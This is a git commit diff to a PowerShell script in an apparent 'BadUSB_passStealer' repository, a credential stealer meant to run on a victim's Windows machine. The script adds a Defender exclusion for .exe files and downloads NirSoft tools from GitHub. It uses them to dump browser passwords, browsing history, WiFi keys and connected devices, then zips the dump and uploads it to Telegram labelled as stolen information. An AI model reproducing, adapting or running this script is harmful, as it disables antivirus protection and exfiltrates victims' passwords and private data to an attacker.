2f18b15841556c5e2459449e6d4d60346d62e666
tuconnaisyouknow <yenghele@fayou.cloud>
2023-10-02 13:52:56 +0200

    Update ciaoV2_upload.ps1

--- upload/ciaoV2_upload.ps1
+++ upload/ciaoV2_upload.ps1
@@ -7,17 +7,19 @@
 Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 mkdir dump
-Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile dump/fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile dump/BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile dump/WNetWatcher.exe #Download the nirsoft tool for connected devces
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile dump/WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile dump/WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
+Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 Invoke-WebRequest LINK -OutFile telegram_uploader.exe #Download uploader file tu upload all informations on telegram
+cd dump
 .\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_passwords.txt #Create the file for Browser passwords
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
+cd ..
 #Set mail option
 Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
 ./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
